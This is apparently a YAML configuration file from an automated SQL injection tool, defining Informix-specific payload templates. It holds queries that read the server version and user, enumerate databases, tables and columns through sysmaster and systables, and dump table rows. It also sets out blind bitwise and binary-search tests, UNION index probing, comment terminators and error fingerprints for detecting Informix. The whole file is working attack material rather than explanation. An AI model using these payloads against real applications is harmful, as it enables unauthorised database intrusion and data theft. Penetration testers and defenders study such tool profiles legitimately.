vendor: Informix

resource:
 info: |
  select trim(
      dbinfo('version','full')
      || '${enclose_value_sql}'
      || dbservername
      || '${enclose_value_sql}'
      || user
      || '${trail_sql}'
  ) r
  from table(set{1})

 schema:
  database: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(t.name)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from
           (select distinct name from sysmaster:informix.sysdatabases) t,
           (select distinct name from sysmaster:informix.sysdatabases) t1
       where t.name >= t1.name
       group by 1
       ${limit}
   ) a

  table: |
   select
       rr
       ||'${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(t.tabname)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from
           (select distinct tabname from ${database}:informix.systables) t,
           (select distinct tabname from ${database}:informix.systables) t1
       where t.tabname >= t1.tabname
       group by 1
       ${limit}
   ) a

  column: |
   select
       rr
       || '${trail_sql}'
       r
   from (
       select
           '${enclose_value_sql}'
           || trim(t.colname)
           || '${separator_qte_sql}0${enclose_value_sql}'
           rr
       from
           (select distinct colname from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}') t,
           (select distinct colname from ${database}:informix.syscolumns c join ${database}:informix.systables t on c.tabid = t.tabid where tabname = '${table}') t1
       where t.colname >= t1.colname
       group by 1
       ${limit}
   ) a

  row:
   query: |
    select
        rr
        || '${trail_sql}'
        r
    from (
        select
            '${enclose_value_sql}'
            || trim(t.s)
            || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
           (select distinct ${fields} s from ${database}:${table}) t,
           (select distinct ${fields} s from ${database}:${table}) t1
        where t.s >= t1.s
        group by 1
        ${limit}
    ) a
   fields:
    field: trim(nvl(${field.value}, ''))
    concat: "|| '%7f' ||"

strategy:
 configuration:
  slidingWindow: |
   select
       '${lead}'
       || substr(
           r,
           ${window.char},
           32767
       ) r
   from (
       ${injection}
   ) x
  limit: having count(*) between ${limit.value} and ${limit.value}
  failsafe: |
   select
       (1337${indice}7330%2b1)
       || '' r
   from table(set{1})
  calibrator: rpad('${calibrator_sql}', 1024, '${calibrator_sql}')
  limitBoundary: 1
  endingComment: --+-
  fingerprint:
   errorMessage:
    - Found a quote for which there is no matching quote\. \[SQL State=
    - "\\[Informix\\]\\[Informix ODBC Driver\\]General error\\. \\(SQLPrepare\\["
    - Informix database
   # 'where matches' to avoid collision with cubrid
   vendorSpecific: 1=case when ${test} then 1 else (select 2 from table(set{1}) where '' matches '') end

 binary:
  test:
   bit: |
    0 != bitand(
        ascii(substr(
            (${injection}),
            ${window.char},
            1
        )),
        ${bit}
    )
   bin: |
    substr(
        (${injection}),
        ${window.char},
        1
    )
    %3E%3Dchr(${mid.int})
   truthyBin:
    - chr(97)%3E%3Dchr(97)
    - chr(97)%3E%3Dchr(65)
    - chr(97)%3E%3Dchr(48)
    - chr(98)%3E%3Dchr(97)
    - chr(98)%3E%3Dchr(66)
    - chr(49)%3E%3Dchr(48)
   falsyBin:
    - chr(97)%3E%3Dchr(98)
    - chr(65)%3E%3Dchr(97)
    - chr(66)%3E%3Dchr(98)
    - chr(66)%3E%3Dchr(97)
    - chr(48)%3E%3Dchr(65)
    - chr(48)%3E%3Dchr(49)
  modeAnd: and
  modeOr: or
  blind: ${binary.mode} ${test}

 union:
  indices: union select ${result_range} from (${indice_unique}) b
  capacity: "'${lead}${indice}' || ${calibrator}"
  orderBy: order by 1337